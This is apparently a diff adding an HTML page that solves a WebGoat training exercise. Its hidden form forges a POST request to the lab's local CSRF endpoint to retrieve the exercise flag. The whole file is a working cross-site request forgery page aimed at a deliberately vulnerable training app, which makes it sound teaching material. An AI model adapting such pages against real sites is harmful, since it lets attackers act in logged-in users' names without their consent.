@@ -1,0 +1,11 @@
+<!-- Trigger the form below from an external source while logged in. The response will include a 'flag' (a numeric value). -->
+
+<html>
+<body>
+ <form action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag" method="POST">
+  <input name="csrf" value="false" type="hidden">
+  <input name="submit" type="hidden" value="submit-Query">
+  <input type="submit" value="Submit">
+ </form>
+</body>
+</html>
